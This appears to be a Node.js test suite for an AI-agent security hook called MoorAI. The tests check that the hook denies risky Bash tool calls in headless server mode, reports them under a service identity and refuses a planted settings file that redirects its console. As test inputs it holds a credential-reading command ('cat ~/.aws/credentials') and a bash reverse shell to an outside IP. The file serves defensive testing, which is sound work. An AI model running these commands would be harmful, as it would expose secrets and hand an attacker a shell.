// Per-file runner:  node --test --import ./test/hermetic-env.mjs test/server-mode-hook.test.mjs
//
// Server mode end to end through the real hook (cli/moorai-hook.mjs) and a local console listener: env
// configuration, the headless ask, the service identity, and the settings-file tamper refusal — plus the
// laptop control for each, which must be unchanged.
//
// SKIPPED until the hook imports cli/server-mode.mjs: this file owns the assertions, the hook owner owns
// the wiring (the unified diff in the server-mode report), and a red suite in the meantime would only hide
// other agents' results.
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir, userInfo, hostname } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { readFileSync } from "node:fs";
import http from "node:http";
import { hashWithKey, deriveKey } from "../cli/content-hash.mjs";
import { rmTree } from "./fs-cleanup.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const HOOK = join(ROOT, "cli", "moorai-hook.mjs");
const WIRED = readFileSync(HOOK, "utf8").includes("server-mode.mjs");
const skip = WIRED ? false : "hook wiring for server mode not landed yet (cli/moorai-hook.mjs)";

const TOKEN = "tok-srvhook-SECRET-3b7e";
const TENANT = "srv-test";
const CRED = "cat ~/.aws/credentials";                       // #55, built-in "justify" → ask on a laptop
const SHELL = "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1";  // #54, built-in "block"
const actorOf = (user, device) => hashWithKey(deriveKey(TOKEN), `${user}@${device}`);

async function consoleServer(policy = { captureTier: "content-free" }) {
  const alerts = [], requests = [];
  const srv = http.createServer((req, res) => {
    let body = "";
    req.on("data", (d) => (body += d));
    req.on("end", () => {
      requests.push({ method: req.method, url: req.url, token: req.headers["x-install-token"] || "" });
      if (req.method === "POST" && req.url === "/api/alerts") { alerts.push(JSON.parse(body)); res.writeHead(201); return res.end("{}"); }
      if (req.url.startsWith("/api/policy/pubkey")) { res.writeHead(404); return res.end(); }
      if (req.url.startsWith("/api/policy")) { res.writeHead(200, { "content-type": "application/json" }); return res.end(JSON.stringify(policy)); }
      res.writeHead(404); res.end();
    });
  });
  await new Promise((r) => srv.listen(0, "127.0.0.1", r));
  return { url: `http://127.0.0.1:${srv.address().port}`, alerts, requests, close: () => srv.close() };
}
function sandbox(config) {
  const home = mkdtempSync(join(tmpdir(), "moorai-srvhook-"));
  mkdirSync(join(home, ".moorai"), { recursive: true });
  mkdirSync(join(home, "proj"), { recursive: true });
  if (config) writeFileSync(join(home, ".moorai", "config.json"), JSON.stringify(config));
  return home;
}
function run(home, command, env = {}, extra = {}) {
  const payload = { hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command }, session_id: "srv", cwd: join(home, "proj"), permission_mode: "bypassPermissions", ...extra };
  return new Promise((res) => {
    const c = spawn(process.execPath, [HOOK], { cwd: join(home, "proj"), env: { PATH: process.env.PATH || "/usr/bin:/bin", HOME: home, USERPROFILE: home, XDG_CONFIG_HOME: join(home, ".config"), XDG_STATE_HOME: join(home, ".local", "state"), CLAUDE_PROJECT_DIR: join(home, "proj"), ...env } });
    let out = "", err = "";
    c.stdout.on("data", (d) => (out += d)); c.stderr.on("data", (d) => (err += d));
    c.on("close", (status) => { assert.equal(status, 0, err); const t = out.trim(); res({ out: t ? JSON.parse(t) : {}, raw: out + err }); });
    c.stdin.end(JSON.stringify(payload));
  });
}
const decision = (o) => (o.hookSpecificOutput && o.hookSpecificOutput.permissionDecision) || (o.systemMessage ? "coach" : "allow");
const srvEnv = (url, extra = {}) => ({ MOORAI_MODE: "server", MOORAI_SERVER_URL: url, MOORAI_TENANT: TENANT, MOORAI_INSTALL_TOKEN: TOKEN, MOORAI_SERVICE_ID: "ci-bot", ...extra });

test("server mode from env alone: a justify call is denied (no approver), reported under the service identity with the env token", { skip }, async () => {
  const c = await consoleServer();
  const home = sandbox(null); // no ~/.moorai/config.json: the binding is the environment
  try {
    const r = await run(home, CRED, srvEnv(c.url));
    assert.equal(decision(r.out), "deny", JSON.stringify(r.out));
    assert.match(r.out.hookSpecificOutput.permissionDecisionReason, /^MoorAI: denied via Bash — #55 .* held for approval, but this is a headless run \(MoorAI server mode\) and no approver exists\. Do not retry/);
    assert.ok(!r.raw.includes(TOKEN), "the install token reached stdout/stderr");
    assert.ok(c.requests.length && c.requests.every((q) => q.token === TOKEN), "every console request carries the env token");
    const who = { user: "service", device: "svc:ci-bot", actor: actorOf("service", "svc:ci-bot") };
    const f = c.alerts.find((a) => a.threatId === 55);
    assert.ok(f, `no #55 alert: ${JSON.stringify(c.alerts.map((a) => a.category))}`);
    assert.deepEqual({ user: f.user, device: f.device, actor: f.actor, tenant: f.tenant }, { ...who, tenant: TENANT });
    const h = c.alerts.find((a) => a.contentHash === "headless-ask:deny");
    assert.ok(h, "no headless-ask alert");
    assert.equal(h.permissionMode, "bypassPermissions");
    assert.deepEqual(h.headlessAsk, { mode: "deny", source: "default" });
    for (const a of c.alerts) assert.ok(a.user === "service" && a.device === "svc:ci-bot", `an alert carried a laptop identity: ${a.category}`);
  } finally { c.close(); rmTree(home); }
});

test("laptop control: the same call with the same token in ~/.moorai/config.json still asks, as user@host", { skip }, async () => {
  const c = await consoleServer();
  const home = sandbox({ serverUrl: c.url, tenant: TENANT, installToken: TOKEN });
  try {
    // Default permission mode: the laptop asks, as user@host.
    const r = await run(home, CRED, { MOORAI_SERVICE_ID: "ignored-when-off", MOORAI_SERVER_URL: "http://127.0.0.1:1" }, { permission_mode: "default" });
    assert.equal(decision(r.out), "ask");
    const f = c.alerts.find((a) => a.threatId === 55);
    assert.deepEqual({ user: f.user, device: f.device, actor: f.actor }, { user: userInfo().username, device: hostname(), actor: actorOf(userInfo().username, hostname()) });
    // Bypass mode (the run() default): nobody would see the prompt, so the enrolled laptop denies through
    // the bypass step, never the headless (server-mode) one.
    const b = await run(home, CRED, { MOORAI_SERVICE_ID: "ignored-when-off", MOORAI_SERVER_URL: "http://127.0.0.1:1" });
    assert.equal(decision(b.out), "deny");
    assert.match(b.out.hookSpecificOutput.permissionDecisionReason, /permission prompts are bypassed/);
    assert.ok(c.alerts.some((a) => a.contentHash === "bypass-ask:deny" && a.reasonCode === "BYPASS_ASK"));
    assert.ok(!c.alerts.some((a) => String(a.contentHash).startsWith("headless-ask")));
  } finally { c.close(); rmTree(home); }
});

test("server mode enforces without a token (a laptop without one only coaches)", { skip }, async () => {
  const home = sandbox(null);
  try {
    const srv = await run(home, SHELL, { MOORAI_MODE: "server", MOORAI_SERVER_URL: "http://127.0.0.1:1", MOORAI_SERVICE_ID: "tokenless" });
    assert.equal(decision(srv.out), "deny", JSON.stringify(srv.out));
    const cred = await run(home, CRED, { MOORAI_MODE: "server", MOORAI_SERVER_URL: "http://127.0.0.1:1" });
    assert.equal(decision(cred.out), "deny");
    const lap = await run(home, SHELL, { MoorAI_SERVER: "http://127.0.0.1:1" });
    assert.equal(decision(lap.out), "coach", JSON.stringify(lap.out));
  } finally { rmTree(home); }
});

test("allow-with-report comes from the org policy, never from the environment", { skip }, async () => {
  const c = await consoleServer({ captureTier: "content-free", headlessAsk: "allow-with-report" });
  const home = sandbox(null);
  try {
    let r = await run(home, CRED, srvEnv(c.url));
    assert.equal(decision(r.out), "allow", JSON.stringify(r.out));
    const rel = c.alerts.find((a) => a.contentHash === "headless-ask:allow");
    assert.ok(rel && rel.riskLevel === "High" && rel.headlessAsk.source === "policy");
    r = await run(home, CRED, srvEnv(c.url, { MOORAI_HEADLESS_ASK: "deny" }));
    assert.equal(decision(r.out), "deny", "env may harden the policy's release");
  } finally { c.close(); rmTree(home); }
  const c2 = await consoleServer();
  const home2 = sandbox(null);
  try {
    const r = await run(home2, CRED, srvEnv(c2.url, { MOORAI_HEADLESS_ASK: "allow-with-report" }));
    assert.equal(decision(r.out), "deny", "env cannot release an ask");
  } finally { c2.close(); rmTree(home2); }
});

test("a project settings file that sets MOORAI_SERVER_URL is refused: the planted console gets nothing, the real one gets a tamper alert", { skip }, async () => {
  const real = await consoleServer();
  const evil = await consoleServer();
  const home = sandbox({ serverUrl: real.url, tenant: TENANT });
  try {
    mkdirSync(join(home, "proj", ".claude"), { recursive: true });
    writeFileSync(join(home, "proj", ".claude", "settings.json"), JSON.stringify({ env: { MOORAI_SERVER_URL: evil.url } }));
    // What Claude Code does with that file: the hook's environment carries the file's value.
    const r = await run(home, CRED, srvEnv(evil.url));
    assert.equal(decision(r.out), "deny");
    assert.equal(evil.requests.length, 0, `planted console was contacted: ${JSON.stringify(evil.requests)}`);
    const t = real.alerts.find((a) => String(a.contentHash).startsWith("server-env-tamper:"));
    assert.ok(t, `no tamper alert: ${JSON.stringify(real.alerts.map((a) => a.category))}`);
    assert.deepEqual(t.refusedEnv, ["MOORAI_SERVER_URL"]);
    assert.ok(!JSON.stringify(t).includes(evil.url), "tamper alert leaked the planted value");
  } finally { real.close(); evil.close(); rmTree(home); }
});

test("GitHub Actions fallback names the workload repo:workflow:job; the run id is not part of it", { skip }, async () => {
  const c = await consoleServer();
  const home = sandbox(null);
  try {
    const gh = { GITHUB_ACTIONS: "true", GITHUB_REPOSITORY: "acme/api", GITHUB_WORKFLOW: "claude", GITHUB_JOB: "review", GITHUB_RUN_ID: "42" };
    const env = srvEnv(c.url, gh); delete env.MOORAI_SERVICE_ID;
    await run(home, CRED, env);
    const f = c.alerts.find((a) => a.threatId === 55);
    assert.equal(f.device, "svc:github:acme/api:claude:review");
    assert.equal(f.actor, actorOf("service", "svc:github:acme/api:claude:review"));
  } finally { c.close(); rmTree(home); }
});
